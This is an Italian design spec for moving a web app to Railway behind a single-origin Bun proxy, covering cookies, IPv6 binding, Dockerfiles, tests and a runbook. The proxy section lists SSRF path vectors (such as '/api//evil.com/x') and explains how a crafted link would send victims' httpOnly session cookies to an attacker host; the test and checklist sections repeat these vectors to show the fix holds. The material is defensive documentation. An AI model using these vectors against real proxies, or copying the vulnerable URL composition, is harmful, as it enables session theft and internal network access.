# Fase 6 — Cutover: deploy su Railway a origin singola

> Spec di design. Ultima fase della migrazione `gc-frontend` + `gc-server` → `gestione-casa`.
> Le Fasi 0-5 sono chiuse e mergiate su `master` (`366b83c`).
>
> Roadmap di riferimento: `2026-07-01-gc-migration-design.md` §10 — «Fase 6 — Cutover.
> Deploy 2 servizi, dominio custom, smoke test, switch, monitoraggio».
> **Questa spec devia dalla roadmap su un punto sostanziale — il dominio custom — e la
> §2 spiega perché e a che prezzo.**
>
> **Corretta il 2026-08-12**, a implementazione conclusa, su sei punti emersi pianificando e
> implementando: l'healthcheck dell'api esisteva già (§9), `sw.js` non ha bisogno di modifiche
> di codice (§5), `e2e/proxy.test.ts` è sostituito dalla verifica locale col comando `preview`
> (§8), il bind `::` riguarda entrambi i servizi (§3), il bundle spediva React di sviluppo
> (§5), e la forma del proxy descritta all'inizio era una SSRF (§4). Ogni correzione è
> annotata sul posto invece di essere riscritta in silenzio: l'errore è la parte istruttiva.

---

## 1. Obiettivo e scope

Portare `apps/api` e `apps/web` in produzione sul progetto Railway già esistente,
**accanto** allo stack legacy che resta acceso e intatto, e verificare in un browser reale
(incluso Safari su iOS) che l'applicazione nuova funzioni end-to-end sui dati di produzione.

Non c'è migrazione dati: `apps/api` parla allo **stesso Postgres, stesso schema `gc`** del
legacy (lo schema Drizzle è stato generato con `drizzle-kit pull` dal DB esistente). Il
cutover è uno spostamento di traffico, non una finestra di manutenzione.

### Fuori scope (deciso esplicitamente)

- **Spegnimento dei servizi legacy.** Restano accesi. La decisione di dismetterli è
  dell'utente, dopo un periodo d'uso dello stack nuovo. Questa spec documenta come si fa,
  non lo fa.
- **Dominio custom.** Rifiutato per il costo annuo di registrazione (vedi §2).
- **E2E in CI**, **PWA E2E**, **narrowing di `apiErrorMessage` a 400/422**, **loading/empty
  state su `AndamentoList`**: backlog ereditato dalla Fase 5, invariato.
- **Code splitting.** Il bundle era ~1,17 MB minificato. Di quel peso, ~300 KB erano React
  in modalità **sviluppo**: un guasto scoperto durante l'implementazione (`NODE_ENV`, §5) e
  corretto qui, che porta la misura a ~900 KB. Spezzare il resto in chunk resta una fase a
  sé; la misura su rete reale si fa nella verifica manuale (§9).

---

## 2. Il vincolo che determina la topologia

La Fase 2 ha sostituito l'auth legacy (`Authorization: Bearer` + token in `localStorage`,
`gc-frontend/src/app/http-interceptors/auth-interceptor.service.ts:18-21`) con cookie
httpOnly. È un miglioramento reale — un token in `localStorage` è leggibile da qualunque
XSS, un cookie httpOnly no — ma sposta il meccanismo di autenticazione da una dimensione
che i browser non regolano (un header) a una che regolano strettamente (un cookie), e la
regolano in base al **site**, non all'origin.

La roadmap lo aveva annotato: «Fase 2 — Prerequisito: dominio custom». Il debito è stato
contratto lì e va pagato qui.

### Perché due sottodomini Railway non bastano

`up.railway.app` è nella **Public Suffix List**:

```
curl -s https://publicsuffix.org/list/public_suffix_list.dat | grep -x 'up.railway.app'
```

Ne seguono due conseguenze, entrambe fatali per la topologia a due domini pubblici:

1. **`COOKIE_DOMAIN=.up.railway.app` è impossibile.** Un browser rifiuta un `Set-Cookie`
   con `Domain` su un suffisso pubblico — altrimenti qualunque applicazione su Railway
   potrebbe scrivere cookie a tutte le altre.
2. **`gestione-casa.up.railway.app` e `gestione-casa-api.up.railway.app` sono due *site*
   distinti**, non due sottodomini dello stesso site: poiché il suffisso pubblico è
   `up.railway.app`, il dominio registrabile (eTLD+1) di ciascuno è l'host stesso. Una
   `fetch()` dal primo al secondo è quindi **cross-site**, e
   `apps/api/src/auth/cookies.ts:18` usa `sameSite: 'lax'`, che non viene inviato su
   richieste cross-site. Il login risponderebbe 200 e ogni richiesta successiva 401.

### Perché i 17 test E2E della Fase 5 non lo intercettano

Girano su `localhost:3001` → `localhost:5001`. È cross-**origin** (la porta differisce, la
CORS si applica, il preflight avviene per davvero) ma **same-site**: la porta non entra nel
calcolo del same-site. `SameSite=Lax` lì passa. La suite verifica correttamente la CORS e
il preflight CSRF; semplicemente non può distinguere «due origin» da «due site», e la
differenza è esattamente ciò che rompe la produzione.

### Opzioni valutate e scartate

| Opzione | Costo | Perché scartata |
|---|---|---|
| Dominio custom (`app.d` + `api.d`, `COOKIE_DOMAIN=.d`) | 0 righe di codice, ~10 €/anno | Costo annuo rifiutato dall'utente. Era la strada della roadmap: zero modifiche al codice, e la topologia che gli E2E descrivono. |
| `SameSite=None; Secure` sui due sottodomini Railway | ~4 righe | I cookie diventano **di terze parti**. Safari li blocca per impostazione predefinita, e su iOS/iPadOS *ogni* browser è WebKit: l'app sarebbe inutilizzabile da iPhone, e il sintomo non è un errore ma un login che non autentica mai. Chrome li invia ancora (la dismissione è stata annullata nel 2025) ma è una decisione commerciale reversibile. |

### Decisione: origin singola

Un solo host pubblico serve sia l'applicazione sia l'API. I cookie tornano **first-party**:
`SameSite=Lax` funziona, `COOKIE_DOMAIN` non serve, la CORS in produzione diventa inerte, e
nessun browser presente o futuro ha motivo di interferire.

Nota non ovvia a favore di questa scelta: la difesa CSRF dell'applicazione **non dipende da
`SameSite`**. La Fase 4b ha introdotto l'header custom obbligatorio (`X-Requested-With:
gc-web`, verificato da `assertCsrf` su ogni `POST/PUT/PATCH/DELETE`, con la CORS che elenca
esplicitamente l'header ammesso). La protezione resta quella, identica, in qualunque
topologia.

---

## 3. Topologia

```
progetto Railway (esistente)
 │
 ├─ Postgres                      invariato — rete privata, schema gc
 ├─ gc-server    legacy           invariato, resta acceso
 ├─ gc-frontend  legacy           invariato, resta acceso
 │
 ├─ api    gestione-casa-api.up.railway.app     (pubblico, solo per debug manuale)
 │         bind :: — porta 5000
 │
 └─ web    gestione-casa.up.railway.app         (l'host che usano le persone)
           bind :: — porta 3000
             ├─ /api/*  ──fetch──▶  api.railway.internal:5000     rete privata
             └─ /*      ──────────▶  dist/  (serve.ts, fallback SPA)
```

### Il bind su `::` non è un dettaglio (per **entrambi** i servizi)

La rete privata di Railway risolve `*.railway.internal` **solo su IPv6** negli ambienti
creati prima del 2025-10-16 (quelli successivi risolvono anche IPv4). Il progetto in
questione è anteriore, quindi va trattato come IPv6-only.

`apps/api/src/index.ts:4` fa oggi `.listen(env.PORT)`, che in Bun significa bind su
`0.0.0.0`: **solo IPv4**. Il servizio risulterebbe sano, raggiungibile dall'edge pubblico, e
al tempo stesso invisibile al proxy interno — `ECONNREFUSED` a deploy riuscito, il modo più
dispendioso di scoprire il problema.

**Lo stesso vale per il web**, che questa spec inizialmente trattava come se il bind
riguardasse solo l'api: anche l'edge pubblico di Railway raggiunge i container attraverso la
rete privata, quindi un `serve.ts` in ascolto su `0.0.0.0` è esposto al medesimo guasto — con
l'aggravante che sarebbe l'host che usano le persone. `serve.ts` passa da `Bun.serve({ port })`
a `Bun.serve({ port, hostname: '::' })`; l'api da `.listen(env.PORT)` a
`.listen({ port: env.PORT, hostname: '::' })`. Sono due chiamate diverse (`Bun.serve` contro
il `.listen` di Elysia), quindi vanno verificate separatamente.

Bind su `::` verificato dual-stack su entrambi i servizi: il socket in ascolto diventa
`*:5000` / `*:3000` (era `0.0.0.0:*`) e `/health` risponde sia su `127.0.0.1` sia su `[::1]`,
quindi dev, `bun test` ed E2E non cambiano comportamento.

### Il dominio pubblico dell'api

Assegnato su richiesta dell'utente, per poter interrogare l'api con `curl` senza passare dal
proxy. **Il frontend non lo usa mai**: `PUBLIC_API_URL` punta al proxy.

Conseguenza da conoscere: i cookie emessi dall'api sono host-only (nessun `Domain`), quindi
una sessione aperta attraverso il dominio pubblico dell'api è **una sessione separata** da
quella dell'applicazione — cookie su un host diverso. Non è una falla (serve comunque la
password), ma spiega perché un login fatto con `curl` su quel dominio non «appare» nel
browser e viceversa. La `CORS_ORIGIN` resta impostata sull'host del web, quindi una pagina
ospitata su un'altra origin non può leggere le risposte dell'api.

---

## 4. Il proxy

Vive in `apps/web/serve.ts`, che già esiste e già contiene il fallback SPA e la difesa
contro i symlink fuori da `dist/`. Il commento in testa al file lo annunciava: «Fase 6
reuses this file to serve the SPA in production».

### Forma

Per ogni richiesta il cui path inizia con `/api/`: si toglie il prefisso, si **applica il path
al bersaglio con il setter di `pathname`**, si inoltra con `fetch(new Request(target, req), {
redirect: 'manual' })` e si restituisce la `Response` così com'è.

Nessuna riscrittura di header, nessun buffering, nessuna gestione dei redirect (l'api non ne
emette; `redirect: 'manual'` impedisce che il proxy ne segua uno per conto proprio invece di
lasciarlo al browser).

⚠️ **Il bersaglio non va composto con `new URL(path, API_INTERNAL_URL)`.** Era la forma
descritta nella prima stesura di questa spec, ed è una **SSRF**. Un path che inizia con `//`
è un riferimento *network-path* (RFC 3986 §4.2): `new URL` ne tiene solo lo **schema** della
base e prende l'**autorità dal path**. Misurato:

| Richiesta | Bersaglio composto con `new URL(path, base)` |
|---|---|
| `/api//evil.com/x` | `http://evil.com/x` — **fuga** |
| `/api///evil.com/x` | `http://evil.com/x` — **fuga** |
| `/api/\evil.com/x` | `http://evil.com/x` — **fuga** |
| `/api/\\evil.com/x` | `http://evil.com/x` — **fuga** |
| `/api/utente/me` | `http://api.railway.internal:5000/utente/me` |

I due vettori con backslash non sono in realtà distinti: `new URL(req.url)` normalizza `\` in
`/` **prima** che il codice del proxy veda il path. Vanno comunque nei test, perché è il
parser a garantirlo e non il proxy.

L'impatto è più grave di una SSRF generica, e per una ragione che riguarda proprio questa
fase: `Cookie` viaggia con `new Request(target, req)`, quindi un link
`https://gestione-casa.up.railway.app/api//attacker.com/` cliccato dalla vittima consegna
**i suoi cookie di sessione httpOnly** al server dell'attaccante. `httpOnly` protegge da
JavaScript, non da un proxy che li rispedisce. E poiché il proxy vive *dentro* la rete privata
di Railway, la stessa falla raggiunge gli altri servizi interni.

La difesa è **strutturale**, non una normalizzazione dell'input:

```ts
const target = new URL(apiBase);
target.pathname = pathname.slice(API_PREFIX.length);
target.search = search;
if (target.origin !== apiBase.origin) return new Response('Bad Gateway', { status: 502 });
```

Il setter di `pathname` non può raggiungere l'autorità, quindi l'host viene da
`API_INTERNAL_URL` **per costruzione**. Una regex che collassa gli slash iniziali funziona
anch'essa (verificata su tutti i vettori), ed è stata scartata perché sposta il peso della
prova sul ragionamento a proposito del parser — ragionamento che durante l'analisi si è
rivelato sbagliato una volta. La guardia sull'origin è irraggiungibile finché il setter si
comporta come specificato, e resta come fail-closed: con la composizione vulnerabile
reintrodotta scatta in 0,16 ms invece di far uscire una richiesta in rete (misurata a 393 ms).

Segnalata da una review di sicurezza automatica il 2026-08-12, a implementazione del Task 1
già completata, e confermata sperimentalmente prima di correggerla.

### Evidenza sperimentale

Il proxy funziona solo se `fetch` inoltra e restituisce fedelmente ciò che serve. Misurato
prima di scrivere la spec, con un'api finta e un proxy della forma sopra:

| Cosa | Risultato |
|---|---|
| `Cookie` inviato dal browser → visto a monte | ✅ `access=FOO; refresh=BAR` |
| **Due** `Set-Cookie` a monte → tornano a valle | ✅ entrambi (`getSetCookie().length === 2`) |
| `Origin` e `X-Requested-With` inoltrati | ✅ (servono a CORS e `assertCsrf`) |
| Body su `POST` e `PUT` | ✅ contenuto identico |
| Body grande (200 KB, quindi in streaming) | ✅ integro |
| Base URL Eden con prefisso di path (`…/api`) | ✅ compone correttamente |
| Client su IPv4 verso server bound su `::` | ✅ 200 |

### Perché il prefisso `/api` e non l'inoltro rotta per rotta

Il commento `ponytail:` in `apps/web/public/sw.js:36` prevedeva, nel caso di web e api sullo
stesso dominio, di dover escludere a mano dalla cache del service worker `/utente`,
`/andamento`, `/tipo-spesa` e `/statistiche` — quattro prefissi da tenere sincronizzati con
le rotte dell'api per sempre. Con un prefisso unico l'esclusione sarebbe **una riga** che non
invecchia — e, come mostra §5, nemmeno quella serve: il gestore `fetch` non risponde alle
chiamate api per costruzione. Il ragionamento resta valido come motivo del prefisso, perché
quattro prefissi da mantenere sincronizzati sono un costo anche fuori dal service worker
(qualunque regola futura su percorsi api dovrebbe elencarli).

Il prefisso non tocca il client: `PUBLIC_API_URL` resta un URL assoluto
(`https://gestione-casa.up.railway.app/api`), quindi `apps/web/src/config.ts` e la
costruzione del client Eden non cambiano di una virgola. La superficie REST condivisa con il
legacy (`/utente`, `/andamento`, `/statistiche/*`) resta identica: il prefisso esiste solo
nel tratto browser→proxy e viene rimosso prima di raggiungere l'api.

### Attivazione condizionale

Il proxy è attivo **solo se `API_INTERNAL_URL` è definita**. In sviluppo e nei test la
variabile non c'è, e `serve.ts` si comporta esattamente come oggi (`bun run preview`, il
boot test PWA, `e2e/harness.ts` che importa `createHandler`). Una variabile assente
disattiva una funzionalità di produzione invece di rompere l'ambiente locale.

### Rischio residuo noto

`new Request(target, req)` inoltra anche l'header `Host` originale, quindi l'api vede
l'host del web. Innocuo: l'api non legge `Host` (le rotte non dipendono dall'host, e
l'unica composizione di URL è lato client). Documentato perché diventerebbe rilevante se
l'api iniziasse a costruire URL assoluti da sé.

---

## 5. Modifiche al codice

Sei file, circa 30 righe. È tutto ciò che il cutover richiede al sorgente.

| File | Modifica | Perché |
|---|---|---|
| `apps/api/src/index.ts` | `.listen({ port: env.PORT, hostname: '::' })` + commento sul motivo | §3: senza IPv6 il proxy non raggiunge l'api. Valore fissato nel codice e non in una variabile d'ambiente **deliberatamente**: una variabile dimenticata riprodurrebbe esattamente il guasto che questa riga previene, e `env.ts` è già costruito su questo principio («a mode flag that can be forgotten is a mode flag that disables its own check») |
| `apps/web/serve.ts` | proxy `/api/*` (§4) col bind `::`, attivo se `API_INTERNAL_URL` è definita | ~15 righe nel file che già serve `dist/` |
| `apps/web/public/sw.js` | **solo il commento `ponytail:`**, nessuna modifica di codice | La prima stesura prescriveva `if (url.pathname.startsWith('/api/')) return;`. È codice morto: nel gestore `fetch`, superato il controllo di origin, il worker risponde **solo** se `isImmutableAsset(pathname)` (regex `^\/index-[a-z0-9]+\.(js\|css)$`) o se `request.mode === 'navigate'`. Una chiamata Eden a `/api/...` non soddisfa nessuna delle due: nessun `respondWith`, la richiesta va in rete e non entra mai in cache, anche a origin condivisa. Resta da correggere il commento, che altrimenti indurrebbe qualcuno ad aggiungere quel `return` |
| `apps/web/package.json` | `NODE_ENV=production` nello script `build` | Scoperto durante l'implementazione: il bundler di Bun sostituisce `process.env.NODE_ENV` a build time e in assenza della variabile ambiente ripiega su `"development"`, quindi il bundle di produzione **spediva React in modalità sviluppo** — ~300 KB di messaggi e controlli su ogni primo caricamento, su una build che sembrava sana. **1,2 M → 900 K.** Valore nello script e non nel Dockerfile, così locale, CI e produzione emettono lo stesso artefatto: nel Dockerfile, `smoke`/`preview`/`e2e` verificherebbero un artefatto diverso da quello che riceve l'utente |
| `apps/web/smoke.ts` | asserire la presenza del marcatore `Minified React error` nel bundle | Lo stesso guasto non deve poter tornare in silenzio. Si asserisce la **presenza** del marcatore di produzione, non l'assenza dei messaggi di sviluppo: React di produzione sostituisce i messaggi con codici numerici, quindi il bundle buono è quello che contiene la stringa criptica |
| `apps/api/.env.example`, `apps/web/.env.example` | documentare `API_INTERNAL_URL` e i valori di produzione | Convenzione del progetto: ogni variabile richiesta è documentata in un `.env.example` committato |

---

## 6. Artefatti di deploy

### Perché serve un Dockerfile

La guida Bun di Railway è esplicita: **Railpack non rileva automaticamente i progetti Bun**,
e per il deploy da GitHub occorre un `Dockerfile` nel repository. Non è quindi possibile
limitarsi a configurare comandi di build e start.

Il rovescio positivo: un Dockerfile che pinna `oven/bun:1.3.14-alpine` (tag verificato
esistente) fissa in produzione **la stessa versione di Bun che `ci.yml` pinna per la CI**
(`bun-version: 1.3.14`), invece di affidarsi a un autodetect che può cambiare sotto i piedi.

### Due Dockerfile, contesto alla radice del repo

Il contesto di build è la *root directory* del servizio, che resta `/` per entrambi (i
workspace Bun hanno bisogno del `package.json` e del `bun.lock` di radice: isolare un
servizio in `apps/api` romperebbe la dipendenza `@gc/shared-types: workspace:*`). Il
Dockerfile per servizio si seleziona con la variabile di servizio
**`RAILWAY_DOCKERFILE_PATH`**.

Nessun `railway.json`: con il comando di avvio nel `CMD` del Dockerfile, resta da
configurare per servizio solo il percorso del Dockerfile, le variabili e il dominio. Il
runbook (§9) documenta quei valori; committare un file di config-as-code aggiungerebbe una
seconda fonte di verità senza rimuovere la prima.

- **`apps/api/Dockerfile`** — `bun install --frozen-lockfile`, poi
  `CMD bun run --filter '@gc/api' start` (lo script `start` è ciò che imposta
  `NODE_ENV=production`, che a sua volta attiva i controlli obbligatori di `env.ts` su
  `CORS_ORIGIN` e `COOKIE_SECURE`).
- **`apps/web/Dockerfile`** — `ARG PUBLIC_API_URL` e `ARG PUBLIC_ENABLE_SW`, build del
  bundle, poi `CMD bun apps/web/serve.ts`.

`ponytail:` entrambe le immagini installano tutte le dipendenze del workspace, comprese
quelle di test e quelle dell'altro servizio; se il tempo di build diventa un problema si
passa a `bun install --filter`.

### La trappola: build-time contro runtime

Sul **medesimo servizio web** convivono due variabili che agiscono in momenti diversi:

- `PUBLIC_API_URL` è **build-time**: Bun la inlinea nel bundle (`--env 'PUBLIC_*'`). Va
  dichiarata con `ARG` nel Dockerfile, altrimenti resta letteralmente
  `process.env.PUBLIC_API_URL` nel bundle e `config.ts` solleva l'errore per variabile
  mancante al primo caricamento.
- `API_INTERNAL_URL` è **runtime**: la legge `serve.ts` nel processo Bun del container.
  Deliberatamente **senza** prefisso `PUBLIC_`, perché non deve finire nel bundle: è un
  indirizzo di rete privata che non riguarda il browser.

---

## 7. Variabili di produzione

### Servizio `api`

| Variabile | Valore | Note |
|---|---|---|
| `DATABASE_URL` | reference `${{Postgres.DATABASE_URL}}` | Stesso Postgres del legacy, sulla rete privata |
| `JWT_SECRET` | segreto **nuovo**, diverso dal legacy | Sessioni dei due stack indipendenti |
| `CORS_ORIGIN` | `https://gestione-casa.up.railway.app` | Obbligatoria in produzione (`env.ts`) |
| `COOKIE_SECURE` | `true` | Obbligatoria in produzione (`env.ts`) |
| `COOKIE_DOMAIN` | **non impostata** | Host-only: corretto con l'origin singola, e impossibile su un suffisso pubblico (§2) |
| `PORT` | `5000` | Esplicita: il proxy compone l'URL interno con questa porta |
| `RAILWAY_DOCKERFILE_PATH` | `apps/api/Dockerfile` | |

### Servizio `web`

| Variabile | Valore | Note |
|---|---|---|
| `PUBLIC_API_URL` | `https://gestione-casa.up.railway.app/api` | **Build-time** (§6) |
| `PUBLIC_ENABLE_SW` | `true` | **Build-time**. Attiva la registrazione del service worker |
| `API_INTERNAL_URL` | `http://api.railway.internal:5000` | **Runtime**. Il nome host è quello del servizio api su Railway — va confermato sulla dashboard, non è indovinabile dal repository |
| `PORT` | iniettata da Railway | **Runtime**, letta da `serve.ts`. Non va impostata a mano |
| `RAILWAY_DOCKERFILE_PATH` | `apps/web/Dockerfile` | |

Il bind su `::` **non** è una variabile su nessuno dei due servizi: sta nel codice, per la
ragione data in §3 e §5.

`NODE_ENV` non va impostata a mano su nessuno dei due servizi, ma per ragioni diverse.
Sull'api la imposta lo script `start`, deliberatamente (§6). Sul web la imposta lo script
`build` — che è anche il motivo per cui non va aggiunta qui né nel Dockerfile: una variabile
di servizio renderebbe il bundle di produzione diverso da quello che `smoke` e `preview`
verificano in locale, cioè esattamente la condizione che ha nascosto il guasto descritto
in §5.

---

## 8. Test

### `apps/web/test/serve.test.ts` (file esistente)

Casi nuovi sul proxy, con un'api finta locale come upstream:

1. `/api/utente/me` → l'upstream riceve `/utente/me` (prefisso rimosso).
2. La query string sopravvive all'inoltro.
3. Il `Cookie` della richiesta e l'header CSRF arrivano a monte.
4. **Entrambi** i `Set-Cookie` della risposta tornano a valle.
5. Un `POST` con body JSON arriva integro.
6. **Il proxy non può essere deviato fuori dall'api interna** (§4): i quattro vettori
   `//evil.com/x`, `///evil.com/x`, `/\evil.com/x`, `/\\evil.com/x` arrivano tutti a
   `api.railway.internal` come path, non come host.
7. `/statistiche/casa` (path *non* `/api`) resta servito da `dist/` come fallback SPA — il
   proxy non deve intercettare le rotte dell'applicazione che assomigliano a rotte dell'api.
8. Con `API_INTERNAL_URL` assente, `/api/qualcosa` ricade sul fallback SPA: il
   comportamento locale di oggi è invariato.

Nota d'implementazione, costata tempo: questi test hanno bisogno della `fetch` vera di Bun,
mentre `bun run --filter '@gc/web' test` precarica happy-dom, la cui `fetch` non raggiunge la
rete. Poiché lo script usa `--isolate`, i globali sono per file: `await
GlobalRegistrator.unregister()` nel `beforeAll` di questo file recupera la `fetch` reale senza
toccare gli altri.

### Al posto di un `e2e/proxy.test.ts`: la verifica locale della topologia di produzione

La prima stesura prevedeva un file E2E nuovo. Non si fa, per un vincolo del bundler:
`PUBLIC_API_URL` è inlineata a build time e `e2e/harness.ts` costruisce il bundle **una volta
sola** (`harness.ts:50-54`) con l'URL cross-origin. Un test del proxy nel browser richiederebbe
un secondo build con un `PUBLIC_API_URL` diverso, cioè duplicare i flag di `bun build` fuori
dallo script `build` — la premessa del guasto `NODE_ENV` di §5, ripetuta.

Al suo posto, i casi 1-8 qui sopra coprono il contratto del proxy, e la topologia reale si
verifica **in un browser vero contro l'api vera** con lo script `preview` che già esiste,
senza una riga di codice nuova:

```bash
bun run --filter '@gc/api' dev
cd apps/web && PUBLIC_API_URL=http://localhost:3000/api API_INTERNAL_URL=http://localhost:5000 \
  PUBLIC_ENABLE_SW=true bun run preview
```

Un solo origin, cookie veri, nessun preflight: la checklist è in §9. Copre più di quanto
coprirebbe il file E2E, perché include Safari se lo si apre da Safari.

Vale la disciplina della Fase 5: ogni caso va validato con un mutante deliberato. Misure
utili come riferimento — il mutante che rimuove l'inoltro della query string uccide
esattamente un test; il mutante che reintroduce la composizione vulnerabile di §4 fallisce in
**393 ms**, il tempo di un'uscita di rete reale, contro gli **0,16 ms** della guardia
fail-closed.

### Ciò che nessun test copre

- **Safari e iOS**: non esiste un runner. È il motivo per cui la verifica manuale (§9) è
  parte della definizione di completo e non un extra.
- **Il deploy stesso**: build dell'immagine, risoluzione DNS interna, variabili. Si verifica
  soltanto deployando.

---

## 9. Runbook e verifica manuale

Il runbook di questa sezione — variabili, sequenza di deploy, rollback, convivenza,
dismissione — va committato in una sezione di `README.md`: è l'unica documentazione della
configurazione che vive solo nella dashboard Railway, e senza di essa ricostruire il deploy
richiederebbe di rileggere questa spec.

### Sequenza di deploy

1. Merge del branch della Fase 6 su `master` (la CI passa: lint, typecheck, test, smoke del
   bundle).
2. Nel progetto Railway esistente, creare il servizio **api** dal repo `gestione-casa`:
   variabili di §7, root directory `/`, healthcheck `/health`, dominio pubblico
   `gestione-casa-api.up.railway.app`.
3. Creare il servizio **web**: variabili di §7, root directory `/`, healthcheck `/`,
   dominio pubblico `gestione-casa.up.railway.app`.
4. Verificare nei log dell'api il bind su `::` e la porta 5000.
5. Verifica manuale (sotto).
6. I servizi legacy non si toccano.

### Healthcheck

La prima stesura di questa spec dichiarava fuori scope l'healthcheck dell'api, ritenendo che
non esistesse un endpoint non autenticato che risponda 2xx. **Era sbagliato:**
`apps/api/src/app.ts:27` espone già `GET /health → {status:'ok'}`, non autenticato (`assertCsrf`
riguarda solo i metodi mutanti) e già usato da `e2e/harness.ts:64` per attendere il boot.
L'healthcheck dell'api è quindi gratuito: `healthcheckPath = /health`.

Il servizio web usa `/`, cioè `dist/index.html`. Deliberatamente **non** `/api/health`: farlo
legherebbe la salute del web a quella dell'api, e un'api giù impedirebbe il deploy del
frontend invece di limitarsi a rompere le chiamate dati. `/api/health` attraverso il proxy è
il **primo controllo manuale** dopo il deploy — è la prova, in una riga, che il proxy inoltra e
che la rete privata risolve. (in un browser reale, sui dati di produzione)

- [ ] Login: il cookie di sessione è su `gestione-casa.up.railway.app`, con `HttpOnly` e
      `Secure`, **senza** attributo `Domain`.
- [ ] Reload della pagina: la sessione sopravvive.
- [ ] Logout: i cookie vengono rimossi e la guard rimanda a `/login`.
- [ ] CRUD andamento completo (creazione, modifica, clonazione, eliminazione).
- [ ] I sei schermi `statistiche` disegnano i grafici.
- [ ] Salvataggio del profilo: disconnette, come da Fase 4d.
- [ ] Deep link diretto su `/statistiche/casa`: carica l'applicazione, non un 404.
- [ ] PWA: il service worker si registra, e le chiamate `/api/*` **non** compaiono nella
      cache.
- [ ] **Login da iPhone o Safari**: è la ragione dell'intera topologia.
- [ ] Tempo di caricamento su rete mobile reale (misura del bundle, §1).
- [ ] `curl https://gestione-casa.up.railway.app/api/health` → `{"status":"ok"}`: il proxy
      inoltra e la rete privata risolve. **Primo controllo dopo il deploy.**
- [ ] `curl "https://gestione-casa.up.railway.app/api//example.com/"` → la risposta d'errore
      **dell'api** (404 di Elysia), non il contenuto di `example.com`: la SSRF di §4,
      verificata anche in produzione oltre che nei test.
- [ ] `curl https://gestione-casa-api.up.railway.app/utente/me` → 401: l'api pubblica
      risponde e rifiuta l'accesso non autenticato.

### Rollback

Non c'è nulla da ripristinare: lo stack legacy è acceso e intatto ai suoi indirizzi, sugli
stessi dati. Il rollback consiste nel continuare a usarlo.

### Convivenza dei due stack sullo stesso database

Entrambi leggono e scrivono `gc.utente` e `gc.token`. Due conseguenze da conoscere:

- Un cambio password sullo stack nuovo (`PATCH /utente/me`) revoca **tutti** i refresh
  token, cancellando righe di `gc.token` usate anche dal legacy: la sessione legacy viene
  disconnessa. È la stessa persona, quindi è accettabile, ma non è un caso da diagnosticare
  due volte.
- I `JWT_SECRET` sono diversi, quindi un token di uno stack non è valido nell'altro. È
  voluto: le sessioni sono indipendenti.

### Dismissione del legacy (fuori scope, per quando servirà)

Spegnere i servizi `gc-server` e `gc-frontend` su Railway. Nessuna migrazione dati e nessuna
modifica di DNS: gli host nuovi sono host nuovi. I repository legacy restano come storia.

---

## 10. Rischi

| Rischio | Mitigazione |
|---|---|
| L'api non è raggiungibile sulla rete privata (bind IPv4) | §3, §5: bind `::` fissato nel codice. Sintomo: 502/`ECONNREFUSED` su `/api/*` a servizi entrambi sani |
| `PUBLIC_API_URL` non dichiarata come `ARG` nel Dockerfile del web | §6. Sintomo: pagina bianca al primo caricamento, errore di variabile mancante da `config.ts` |
| Il service worker mette in cache risposte dell'api | §5: non può accadere per come è scritto il gestore `fetch` (risponde solo ad asset immutabili e navigazioni) |
| Il nome host interno non corrisponde al nome del servizio Railway | `API_INTERNAL_URL` è una variabile: si corregge senza rideploy del codice. La verifica è nella checklist |
| I due stack si disturbano tramite `gc.token` | §9: documentato, non prevenuto (comportamento accettato) |
| Il proxy intercetta una rotta dell'applicazione | Caso di test 7 in §8: solo il prefisso `/api/` viene inoltrato |
| Il proxy viene usato per raggiungere host esterni coi cookie della vittima | §4: bersaglio composto col setter di `pathname` (sicuro per costruzione) più guardia sull'origin fail-closed; caso di test 6 in §8 sui quattro vettori |
| Il bundle di produzione spedisce React di sviluppo | §5: `NODE_ENV=production` nello script `build`, con l'asserzione in `smoke.ts` che fallisce se qualcuno la rimuove |

---

## 11. File

**Modificati:** `apps/api/src/index.ts` · `apps/web/serve.ts` · `apps/web/public/sw.js`
(solo commento) · `apps/web/package.json` · `apps/web/smoke.ts` · `apps/api/.env.example` ·
`apps/web/.env.example` · `apps/web/test/serve.test.ts` · `README.md` (sezione runbook)

**Nuovi:** `apps/api/Dockerfile` · `apps/web/Dockerfile` · `.dockerignore`

**Non toccati:** lo schema del database, le rotte dell'api, il client Eden, `config.ts`, la
CORS, `assertCsrf`, i cinque file E2E esistenti, `ci.yml`.

---

## 12. Definizione di completo

1. Le sei modifiche al codice di §5 sono in `master`, con la CI verde (lint, typecheck,
   test, smoke del bundle).
2. I casi proxy di §8 passano in `apps/web/test/serve.test.ts`, ciascuno con il suo mutante
   verificato, e la verifica locale della topologia di produzione (§8) è stata eseguita in un
   browser reale.
3. I due servizi sono deployati sul progetto Railway esistente e rispondono ai loro domini.
4. La checklist di verifica di §9 è completa, **compreso il login da Safari o iPhone**.
5. Il runbook (variabili, sequenza di deploy, rollback, convivenza, dismissione) è
   committato nel repository.
6. I servizi legacy sono ancora accesi e funzionanti.
